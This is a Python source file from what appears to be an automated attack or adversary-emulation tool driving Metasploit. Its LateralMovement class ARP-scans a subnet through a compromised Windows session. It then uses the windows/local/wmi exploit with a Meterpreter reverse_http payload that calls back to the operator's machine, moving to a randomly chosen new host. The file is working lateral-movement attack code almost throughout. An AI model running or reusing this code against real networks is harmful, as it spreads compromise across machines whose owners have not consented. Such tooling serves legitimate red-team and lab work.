from data.event import EventUtils
import re
import random
import socket
import time
from lib.Reconnaissance.reconnaissance import get_my_ip

class LateralMovement():
    
    knownIP = []
    usedIP = []
    gathered = False
    ports = list(range(7000,8000))
    usedPorts = []

    def __init__(self, msfclient, sessionInput):
        if self.gathered == False:
            self.msfclient = msfclient
            self.sessionInput = sessionInput
            post = self.msfclient.client.modules.use('post', 'windows/gather/arp_scanner')
            post['SESSION'] = int(sessionInput)
            post['RHOSTS'] = '192.168.2.0/24'
            post['THREADS'] = 20
            self.cid = self.msfclient.client.consoles.console().cid
            print("Console ID: " + self.cid)
            arp_info = self.msfclient.client.consoles.console(self.cid).run_module_with_output(post)
            for line in arp_info.splitlines():
                if '+' in line:
                    found_ip = re.findall(r'[0-9]+(?:\.[0-9]+){3}', line)[0]
                    #This might need to be changed. Maybe to defaultgateway + .1 or .255
                    if found_ip == '192.168.2.1' or found_ip == '192.168.2.255':
                        pass
                    else:
                        self.knownIP.append(found_ip)
            self.gathered = True
        else:
            print(self.knownIP)


    #TODO:
    #Need to add if a session was created successfully.
    #Could just add a watch on the sessions and a timer.
    def lmove(self):
        if self.knownIP is None:
            print("Ran out of IP!")
        else:
            EventUtils.settingEvent(self, "Using WMI to move to a different client...")
            selectedIP = random.choice(self.knownIP)
            selectedPort = random.choice(self.ports)
            lmove_exploit = ['windows/local/wmi']
            exploit = self.msfclient.client.modules.use('exploit', lmove_exploit[0])
            _payload = self.msfclient.client.modules.use('payload', 'windows/meterpreter/reverse_http')
            exploit['RHOSTS'] = selectedIP
            exploit['SESSION'] = int(self.sessionInput)
            _payload['LHOST'] = get_my_ip()
            _payload['LPORT'] = selectedPort
            EventUtils.settingEvent(self, "Trying to move into " + selectedIP +".")
            print("[!] Trying to move into " + selectedIP + " on port " + str(selectedPort) + ".")
            # exploit.execute(payload=_payload)
            # exploitdata = self.msfclient.client.consoles.console(self.cid).read()
            print(self.msfclient.client.consoles.console(self.cid).run_module_with_output(exploit, payload=_payload))
            self.knownIP.remove(selectedIP)
            self.ports.remove(selectedPort)
            self.usedIP.append(selectedIP)
            self.usedPorts.append(selectedPort)